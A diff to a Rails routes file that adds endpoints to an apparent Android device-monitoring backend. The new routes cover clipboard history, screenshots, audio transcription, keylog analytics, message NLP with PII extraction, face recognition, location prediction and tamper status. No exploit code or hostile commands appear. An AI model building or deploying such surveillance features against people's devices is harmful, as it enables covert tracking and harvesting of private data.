@@ -84,6 +84,19 @@ Rails.application.routes.draw do
 
   # REST API for Android devices (fallback for WebSocket)
   namespace :api do
+    # MCP (Model Context Protocol) Server endpoints
+    scope 'mcp' do
+      post 'initialize', to: 'mcp#initialize_session'
+      get 'tools', to: 'mcp#list_tools'
+      post 'tools/call', to: 'mcp#call_tool'
+      get 'resources', to: 'mcp#list_resources'
+      post 'resources/read', to: 'mcp#read_resource'
+      get 'prompts', to: 'mcp#list_prompts'
+      post 'prompts/get', to: 'mcp#get_prompt'
+      get 'stream/:device_id', to: 'mcp#stream'
+      get 'health', to: 'mcp#health'
+    end
+
     get 'config', to: 'config#show'
     resources :commands, only: [:show] do
       member do
@@ -118,12 +131,39 @@ Rails.application.routes.draw do
     post 'file_browser', to: 'file_browser#receive'
     post 'geofence', to: 'geofence#receive'
 
+    # Two-Factor Authentication
+    post '2fa/enable', to: 'two_factor#enable'
+    post '2fa/verify', to: 'two_factor#verify'
+    post '2fa/disable', to: 'two_factor#disable'
+    get '2fa/backup_codes', to: 'two_factor#backup_codes'
+
+    # Screen Mirroring (Enterprise Remote Support)
+    scope 'devices/:id/screen' do
+      post 'start', to: 'screen_mirror#start'
+      post 'stop', to: 'screen_mirror#stop'
+      get 'status', to: 'screen_mirror#status'
+    end
+
+    # Data Collection Endpoints
+    scope 'devices/:id' do
+      get 'bookmarks', to: 'data_collection#bookmarks'
+      get 'certificates', to: 'data_collection#certificates'
+      get 'wifi_networks', to: 'data_collection#wifi_networks'
+      get 'clipboard_history', to: 'data_collection#clipboard_history'
+      post 'screenshot', to: 'data_collection#screenshot'
+    end
+
     # Keylog Analytics API endpoints
     scope 'devices/:id' do
       get 'keylog_analytics', to: 'keylog_analytics#show'
       get 'keylog_analytics/app_usage', to: 'keylog_analytics#app_usage'
       get 'keylog_analytics/activity_timeline', to: 'keylog_analytics#activity_timeline'
       get 'keylog_analytics/export', to: 'keylog_analytics#export'
+
+      # Audio Intelligence
+      post 'audio/transcribe', to: 'audio#transcribe'
+      get  'audio/transcriptions', to: 'audio#transcriptions'
+      post 'audio/analyze', to: 'audio#analyze'
     end
 
     # Scheduled Commands
@@ -142,6 +182,13 @@ Rails.application.routes.draw do
       get 'location_history', to: 'geofence#location_history'
       get 'location_heatmap', to: 'geofence#location_heatmap'
       get 'geofence_events', to: 'geofence#events'
+    end
+
+    # Security Analysis
+    scope 'devices/:id/security' do
+      get 'gps_analysis', to: 'security_analysis#gps_analysis'
+      get 'media_analysis', to: 'security_analysis#media_analysis'
+      get 'tamper_status', to: 'security_analysis#tamper_status'
     end
     
     # File Browser API
@@ -178,6 +225,48 @@ Rails.application.routes.draw do
     # User Preferences API
     resource :preferences, only: [:show, :update, :destroy] do
       get '/', action: :index, on: :collection
+    end
+
+    # AI Features
+    scope 'ai' do
+      # AI Chat Assistant
+      post 'chat', to: 'ai_chat#chat'
+      get 'chat/capabilities', to: 'ai_chat#capabilities'
+
+      # AI Report Generation
+      post 'reports/generate', to: 'report_generation#generate'
+      get 'reports/templates', to: 'report_generation#templates'
+      post 'reports/risk_assessment', to: 'report_generation#risk_assessment'
+
+      # Predictive Analytics
+      get 'predictions/:device_id', to: 'predictive_analytics#show'
+      get 'predictions/:device_id/location', to: 'predictive_analytics#location'
+      get 'predictions/:device_id/activity', to: 'predictive_analytics#activity'
+      get 'predictions/:device_id/risk', to: 'predictive_analytics#risk'
+      get 'predictions/:device_id/contacts', to: 'predictive_analytics#contacts'
+
+      # Smart Geofencing
+      get 'geofencing/:device_id', to: 'smart_geofencing#show'
+      get 'geofencing/:device_id/places', to: 'smart_geofencing#places'
+      get 'geofencing/:device_id/suggestions', to: 'smart_geofencing#suggestions'
+      get 'geofencing/:device_id/routes', to: 'smart_geofencing#routes'
+      get 'geofencing/:device_id/anomalies', to: 'smart_geofencing#anomalies'
+
+      # NLP Analysis
+      post 'nlp/analyze', to: 'nlp_analysis#analyze'
+      post 'nlp/entities', to: 'nlp_analysis#entities'
+      post 'nlp/sentiment', to: 'nlp_analysis#sentiment'
+      post 'nlp/language', to: 'nlp_analysis#language'
+      post 'nlp/pii', to: 'nlp_analysis#pii'
+      get 'nlp/device_messages/:device_id', to: 'nlp_analysis#device_messages'
+
+      # Image Recognition
+      post 'image/analyze', to: 'image_recognition#analyze'
+      post 'image/ocr', to: 'image_recognition#ocr'
+      post 'image/faces', to: 'image_recognition#faces'
+      post 'image/objects', to: 'image_recognition#objects'
+      post 'image/metadata', to: 'image_recognition#metadata'
+      get 'image/device_images/:device_id', to: 'image_recognition#device_images'
     end
 
     namespace :v1 do
